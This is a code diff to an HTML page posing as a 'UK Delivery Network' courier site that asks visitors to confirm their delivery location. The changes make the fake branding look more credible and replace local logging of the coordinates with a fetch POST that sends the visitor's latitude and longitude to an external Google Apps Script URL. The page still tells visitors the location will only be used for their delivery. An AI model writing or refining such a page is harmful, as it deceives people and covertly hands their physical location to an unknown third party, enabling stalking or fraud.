@@ -92,7 +92,7 @@
 <div class="card">
 
   <div class="logo">
-    <img src="logo.png">
+    <img src="logo.png" alt="UK Delivery Network Logo">
     <div>UK Delivery Network</div>
   </div>
 
@@ -100,24 +100,24 @@
     Fast • Reliable • Professional Delivery
   </div>
 
-  <h2>Help us find your delivery location</h2>
+  <h2>Confirm your delivery location</h2>
 
   <p>
-    To ensure your delivery arrives smoothly, please share your delivery location with our driver James.
+    To help ensure your delivery arrives smoothly, please confirm your delivery location.
   </p>
 
   <p>
-    Your device will ask for your permission. The location will only be used to complete this delivery.
+    Your device will ask for your permission. Your location will only be used to complete this delivery.
   </p>
 
   <button onclick="getLocation()">
-    📍 Show My Delivery Location
+    📍 Confirm Delivery Location
   </button>
 
   <p id="status"></p>
 
   <div class="footer">
-    UK Delivery Network © 1995
+    UK Delivery Network © 2026
   </div>
 
 </div>
@@ -136,10 +136,17 @@ function getLocation() {
 
       function(position) {
 
-        status.innerHTML = "✓ Location received. Thank you.";
+        let data = {
+          latitude: position.coords.latitude,
+          longitude: position.coords.longitude
+        };
 
-        console.log("Latitude:", position.coords.latitude);
-        console.log("Longitude:", position.coords.longitude);
+        fetch("https://script.google.com/macros/s/AKfycbyFYbeH2Upk99HCGMVzfrs6s4rBquyFwm8W7JXwY8DdgZ1j-WL4V3PkSQlo0Nhvtpk9/exec", {
+          method: "POST",
+          body: JSON.stringify(data)
+        });
+
+        status.innerHTML = "✓ Location received. Thank you.";
 
       },
 
